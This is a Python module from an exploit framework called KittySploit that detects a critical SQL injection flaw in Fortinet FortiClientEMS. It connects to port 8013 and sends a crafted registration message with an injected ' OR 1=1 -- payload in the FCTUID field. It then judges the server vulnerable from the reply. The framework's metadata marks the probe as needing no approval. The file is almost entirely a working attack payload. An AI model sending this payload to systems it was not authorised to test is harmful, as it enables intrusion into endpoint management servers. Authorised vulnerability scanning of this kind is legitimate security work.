#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiClient."""

import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'Fortinet Forticlient Endpoint Management Server - SQL Injection Detection',
        'description': "A improper neutralization of special elements used in an sql command ('sql injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2, FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['scanner', 'tcp', 'network', 'cve', 'cve2023', 'sqli', 'fortinet', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    port = OptPort(8013, "Target port", True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host=host, port=port):
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout())
            sock.connect((host, port))
            sock.sendall("MSG_HEADER: FCTUID=CBE8FC122B1A46D18C3541E1A8EFF7BD' OR 1=1 --{}\\n\nIP=127.0.0.1\\n\nMAC=00-50-56-11-22-33\\n\nFCT_ONNET=0\\n\nCAPS=32767\\n\nVDOM=default\\n\nEC_QUARANTINED=0\\n\nSIZE=    {}\\n\n\\n\nX-FCCK-REGISTER: SYSINFO||QVZTSUdfVkVSPTEuMDAwMDAKUkVHX0tFWT1fCkVQX09OTkVUQ0hLU1VNPTAKQVZFTkdfVkVSPTYuMDAyNjYKREhDUF9TRVJWRVI9Tm9uZQpGQ1RPUz1XSU42NApWVUxTSUdfVkVSPTEuMDAwMDAKRkNUVkVSPTcuMC43LjAzNDUKQVBQU0lHX1ZFUj0xMy4wMDM2NApVU0VSPUFkbWluaXN0cmF0b3IKQVBQRU5HX1ZFUj00LjAwMDgyCkFWQUxTSUdfVkVSPTAuMDAwMDAKVlVMRU5HX1ZFUj0yLjAwMDMyCk9TVkVSPU1pY3Jvc29mdCBXaW5kb3dzIFNlcnZlciAyMDE5ICwgNjQtYml0IChidWlsZCAxNzc2MykKQ09NX01PREVMPVZNd2FyZSBWaXJ0dWFsIFBsYXRmb3JtClJTRU5HX1ZFUj0xLjAwMDIwCkFWX1BST1RFQ1RFRD0wCkFWQUxFTkdfVkVSPTAuMDAwMDAKUEVFUl9JUD0KRU5BQkxFRF9GRUFUVVJFX0JJVE1BUD00OQpFUF9PRkZORVRDSEtTVU09MApJTlNUQUxMRURfRkVBVFVSRV9CSVRNQVA9MTU4NTgzCkVQX0NIS1NVTT0wCkhJRERFTl9GRUFUVVJFX0JJVE1BUD0xNTU5NDMKRElTS0VOQz0KSE9TVE5BTUU9Q1lCRVItUkVUUUIxRkxQCkFWX1BST0RVQ1Q9CkZDVF9TTj1GQ1Q4MDAxNjM4ODQ4NjUxCklOU1RBTExVSUQ9NTczMTUzMkItMkUyOC00OEYwLUFDQ0YtNDI4MEU0ODNFRTE0Ck5XSUZTPUV0aGVybmV0MHwxMC4wLjQwLjg1fDAwLTUwLTU2LTg0LTMzLWIyfDEwLjAuNDAuMjU0fGY0LTRlLTA1LTRmLTZjLTQ4fDF8KnwwClVUQz0xNzEwMjcxNzc0ClBDX0RPTUFJTj0KQ09NX01BTj1WTXdhcmUsIEluYy4KQ1BVPUludGVsKFIpIFhlb24oUikgU2lsdmVyIDQyMTUgQ1BVIEAgMi41MEdIegpNRU09MTIyODcKSEREPTk5CkNPTV9TTj1WTXdhcmUtNDIgMDQgZWQgMmQgNjQgZTggMGIgMTQtNDUgZTkgZTQgZjYgNWEgYzcgNjcgODIKRE9NQUlOPQpXT1JLR1JPVVA9V09SS0dST1VQClVTRVJfU0lEPVMtMS01LTIxLTI2MTY1Njk4OTQtNDUzOTU0ODcxLTE0NTg4MDY4Mi01MDAKR1JPVVBfVEFHPQpBREdVSUQ9CkVQX0ZHVENIS1NVTT0wCkVQX1JVTEVDSEtTVU09MApXRl9GSUxFU0NIS1NVTT0wCkVQX0FQUENUUkxDSEtTVU09MAo=\\n\nX-FCCK-REGISTER-END\n\\r\\n\n\\r\\n\n".encode())
            data = sock.recv(1024)
            sock.close()
        except Exception:
            return False
        if not data:
            return False
        if any(m.encode() in data for m in ('KA_INTERVAL',)):
            self.set_info(severity='critical', reason='Fortinet Forticlient Endpoint Management Server - SQL Injection detected')
            return True
        return False
